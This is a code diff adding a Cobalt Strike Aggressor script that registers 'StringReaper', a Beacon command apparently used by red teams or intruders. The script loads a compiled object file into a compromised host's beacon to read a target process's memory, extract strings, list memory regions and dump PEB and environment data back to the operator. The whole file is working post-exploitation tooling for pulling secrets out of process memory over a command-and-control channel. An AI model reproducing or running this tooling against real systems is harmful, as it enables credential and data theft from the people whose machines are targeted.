@@ -1,0 +1,36 @@
+beacon_command_register(
+    "StringReaper", 
+    "get information from remote process",
+    "Usage: StringReaper <PID> <mode> <option1> <option2>
+   [mode]
+     download  : download memory sections to CS Downloads tab (options)
+     strings   : parse strings from memory sections and download to CS Downloads tab (options)
+     list      : list all allocated memory sections in remote process (options)
+     peb       : display PEB information (no options)
+     env       : output remote process env strings (no options)
+   [option1]
+     all
+     private
+     image
+     mapped
+   [option2]
+     all
+     r
+     rw
+     rwx"
+);
+
+alias StringReaper {
+    if(size(@_) > 5)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("StringReaper"));
+        return;
+    }
+    local('$handle $data $args');
+    $handle = openf(script_resource("StringReaper.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    $args = bof_pack($1, "izzz",$2,$3,$4,$5);
+    beacon_inline_execute($1, $data, "go", $args);
+}
